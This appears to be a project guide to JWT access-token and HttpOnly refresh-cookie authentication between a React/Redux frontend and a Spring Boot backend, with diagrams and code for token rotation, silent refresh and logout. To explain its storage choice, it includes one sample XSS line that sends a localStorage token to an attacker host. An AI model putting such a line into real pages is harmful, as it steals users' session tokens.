# End-to-End Authentication & HttpOnly Cookie Validation Flow

This guide explains the complete architecture, security model, and code paths for how authentication tokens are issued, validated, rotated, and handled between the React frontend and Spring Boot backend.

---

## 1. Architecture & Security Model

The system implements a **Hybrid Dual-Token Pattern**:

| Token Type | Purpose | Lifespan | Storage Mechanism | Protected Against |
| :--- | :--- | :--- | :--- | :--- |
| **Access Token** | Authorizes REST API requests via `Authorization: Bearer <jwt>` | Short-lived (15 minutes) | **In-Memory only** (Redux Store) | **XSS (Cross-Site Scripting)** cannot steal it from `localStorage` or `sessionStorage`. |
| **Refresh Token** | Rotates tokens & issues new access tokens | Long-lived (7 days) | **HttpOnly, SameSite=Lax Cookie** | **JavaScript cannot access it** (`document.cookie` is blind to it). |

### Why Not Store Tokens in `localStorage`?
If an attacker executes malicious JavaScript via an XSS vulnerability, any token stored in `localStorage` can be immediately read and exfiltrated:
```javascript
// Malicious script:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```
By keeping the access token **only in React/Redux memory**, the token disappears on page reload. Sessions are maintained securely across page reloads via the **`HttpOnly` cookie**, which JavaScript is barred from reading by browser security specifications.

---

## 2. Complete Sequence Diagram

```mermaid
sequenceDiagram
    autonumber
    actor User
    participant UI as React UI (RTK Query)
    participant Redux as Redux State (In-Memory)
    participant Browser as Browser Cookie Jar
    participant API as Spring Boot (/api/v1/auth)
    participant DB as PostgreSQL Database

    Note over User, API: 1. Login / OAuth2 Flow
    User->>UI: Submit credentials / Google OAuth2
    UI->>API: POST /api/v1/auth/login (credentials: include)
    API->>DB: Validate user & generate RefreshTokenEntity
    API-->>Browser: Set-Cookie: refreshToken=...; HttpOnly; Path=/api/v1/auth; SameSite=Lax
    API-->>UI: Response JSON: { accessToken, user }
    UI->>Redux: setCredentials({ accessToken, user })

    Note over User, API: 2. Authenticated API Request
    UI->>API: GET /api/v1/users/profile (Header: "Bearer <accessToken>")
    API->>API: JwtAuthFilter validates JWT signature & claims
    API-->>UI: 200 OK (User Data)

    Note over User, API: 3. Page Reload (Silent App Bootstrap)
    User->>UI: Refreshes browser (F5) - Redux memory is wiped
    UI->>API: POST /api/v1/auth/refresh (Browser automatically attaches HttpOnly cookie)
    API->>DB: Verify refresh token (not expired, not revoked)
    API->>DB: Revoke old token & generate new rotated token
    API-->>Browser: Set-Cookie: refreshToken=<new_token>; HttpOnly; Path=/api/v1/auth
    API-->>UI: Response JSON: { accessToken: <new_token>, user }
    UI->>Redux: setCredentials({ accessToken, user })

    Note over User, API: 4. Mid-Session Token Expiration (Mutex Re-Auth)
    UI->>API: GET /api/v1/users (expired token)
    API-->>UI: 401 Unauthorized
    Note over UI: Mutex locks out concurrent queries
    UI->>API: POST /api/v1/auth/refresh (Cookie attached)
    API-->>Browser: Set-Cookie: refreshToken=<rotated_token>
    API-->>UI: New accessToken
    UI->>Redux: Update accessToken
    Note over UI: Retries original GET /api/v1/users seamlessly
    UI->>API: GET /api/v1/users (with new accessToken)
    API-->>UI: 200 OK
```

---

## 3. Backend Implementation: Setting & Validating the Cookie

### A. Setting the `HttpOnly` Cookie
In Spring Boot, the `refreshToken` is written to the HTTP response header `Set-Cookie` in `AuthController.java`:

- **File**: `spring-security-backend/src/main/java/in/adityasri/spring_security_backend/controllers/AuthController.java`

```java
private void setRefreshTokenCookie(HttpServletResponse response, String token, boolean isSecure) {
    ResponseCookie cookie = ResponseCookie.from("refreshToken", token)
            .httpOnly(true)            // JavaScript cannot read this cookie (prevents XSS theft)
            .secure(isSecure)          // Requires HTTPS in production (matches request security)
            .path("/api/v1/auth")      // Cookie only sent to authentication endpoints
            .sameSite("Lax")           // CSRF protection while permitting OAuth2 redirects
            .maxAge(Duration.ofDays(refreshTokenExpirationDays)) // 7 days expiration
            .build();
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
}
```

### B. Validating and Rotating the Refresh Token
Every time `/api/v1/auth/refresh` is called:
1. Spring extracts `@CookieValue(name = "refreshToken") String refreshToken`.
2. `RefreshTokenService.java` checks:
   - Does the token exist in the database?
   - Is `revoked == true`? (If revoked, throw `TokenRefreshException`).
   - Is `expiryDate` before `Instant.now()`? (If expired, delete record and throw exception).
3. **Token Rotation**:
   - The used refresh token is revoked: `refreshTokenService.revokeToken(refreshTokenStr)`.
   - A brand new refresh token UUID is persisted.
   - A new access token is signed with the user's roles.
   - The new refresh token is set into a fresh `Set-Cookie` header.

### C. Clearing the Cookie on Logout
- **File**: `AuthController.java`

```java
private void clearRefreshTokenCookie(HttpServletResponse response, boolean isSecure) {
    ResponseCookie cookie = ResponseCookie.from("refreshToken", "")
            .httpOnly(true)
            .secure(isSecure)
            .path("/api/v1/auth")
            .sameSite("Lax")
            .maxAge(0) // Immediately expires the cookie in the browser
            .build();
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
}
```

---

## 4. Frontend (UI) Code Path Walkthrough

The React application handles tokens across several layers:

### Step 1: App Bootstrapping (Silent Refresh on Load)
- **File**: `login-auth-app/src/App.tsx`

```tsx
useEffect(() => {
  const bootstrapAuth = async () => {
    try {
      // Calls POST /api/v1/auth/refresh
      // If the browser holds a valid HttpOnly cookie, this succeeds silently
      await refreshTokenMutation().unwrap();
    } catch {
      // No active refresh token cookie found; user remains in guest state
    } finally {
      dispatch(setInitialized(true));
    }
  };

  bootstrapAuth();
}, [dispatch, refreshTokenMutation]);
```
* Before `isInitialized` is `true`, a loading spinner is displayed to avoid flashing protected screens or prematurely redirecting to `/login`.

---

### Step 2: Sending Cookies with Requests (`credentials: 'include'`)
- **File**: `login-auth-app/src/app/baseQueryWithReauth.ts`

Standard browser `fetch` requests across origins will **not** send cookies unless configured. The `fetchBaseQuery` is configured with:

```typescript
const baseQuery = fetchBaseQuery({
  baseUrl: 'http://localhost:8080/api/v1',
  credentials: 'include', // Instructs the browser to attach cookies for cross-origin requests
  prepareHeaders: (headers, { getState }) => {
    // Retrieves short-lived JWT from in-memory Redux state
    const token = (getState() as any)?.auth?.token;
    if (token) {
      headers.set('Authorization', `Bearer ${token}`);
    }
    return headers;
  },
});
```

---

### Step 3: Mutex Re-Authentication on 401 Unauthorized
- **File**: `login-auth-app/src/app/baseQueryWithReauth.ts`

If a user's 15-minute access token expires while browsing:
1. An API call receives a `401 Unauthorized`.
2. A mutex (`new Mutex()`) locks all outgoing calls so only **one** refresh request is sent to the server.
3. If `/auth/refresh` succeeds:
   - `api.dispatch(setCredentials({ accessToken, user }))` updates Redux memory.
   - The original failed request is retried with the new token.
4. If `/auth/refresh` fails (e.g. cookie expired after 7 days):
   - `api.dispatch(logOut())` clears Redux state and redirects the user to `/login`.

```typescript
if (result.error && result.error.status === 401) {
  if (!mutex.isLocked()) {
    const release = await mutex.acquire();
    try {
      const refreshResult = await baseQuery(
        { url: '/auth/refresh', method: 'POST' },
        api,
        extraOptions
      );

      if (refreshResult.data) {
        const res = refreshResult.data as ApiResponse<AuthResponseDto>;
        api.dispatch(setCredentials({ accessToken: res.data.accessToken, user: res.data.user }));
        result = await baseQuery(args, api, extraOptions); // Retry original query
      } else {
        api.dispatch(logOut());
      }
    } finally {
      release();
    }
  } else {
    await mutex.waitForUnlock();
    result = await baseQuery(args, api, extraOptions);
  }
}
```

---

### Step 4: Google OAuth2 Callback Flow
- **File**: `login-auth-app/src/pages/OAuth2Redirect.tsx`

1. User clicks **"Sign in with Google"**, redirecting browser to `http://localhost:8080/oauth2/authorization/google`.
2. Google authenticates the user and redirects back to Spring Boot's `/login/oauth2/code/google`.
3. `OAuth2SuccessHandler.java` sets the `refreshToken` HttpOnly cookie in the browser response and redirects to `http://localhost:5174/oauth2/redirect`.
4. `OAuth2Redirect.tsx` mounts and executes:
   ```tsx
   await refreshTokenApi().unwrap();
   navigate('/dashboard', { replace: true });
   ```
5. The browser automatically presents the newly set `refreshToken` cookie to `/api/v1/auth/refresh`, receiving the in-memory access token and profile info.

---

### Step 5: Route Protection in the UI
- **File**: `login-auth-app/src/routes/ProtectedRoute.tsx`

```tsx
export const ProtectedRoute: React.FC = () => {
  const { isAuthenticated } = useAuth();
  const location = useLocation();

  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  return <Outlet />;
};
```
* `isAuthenticated` is derived directly from Redux (`selectIsAuthenticated`). It is `true` if and only if a valid `token` exists in memory.

---

### Step 6: User Logout
- **File**: `login-auth-app/src/features/auth/authApiSlice.ts`

```typescript
logout: builder.mutation<ApiResponse<void>, void>({
  query: () => ({
    url: '/auth/logout',
    method: 'POST',
  }),
  async onQueryStarted(_arg, { dispatch, queryFulfilled }) {
    try {
      await queryFulfilled;
    } finally {
      dispatch(logOut());
      dispatch(apiSlice.util.resetApiState()); // Clears RTK Query cache
    }
  },
}),
```
1. Calls `POST /api/v1/auth/logout`.
2. Backend revokes the token in the DB and returns `Set-Cookie: refreshToken=""; Max-Age=0`.
3. Browser deletes the cookie.
4. UI resets Redux state (`user = null`, `token = null`, `isAuthenticated = false`).
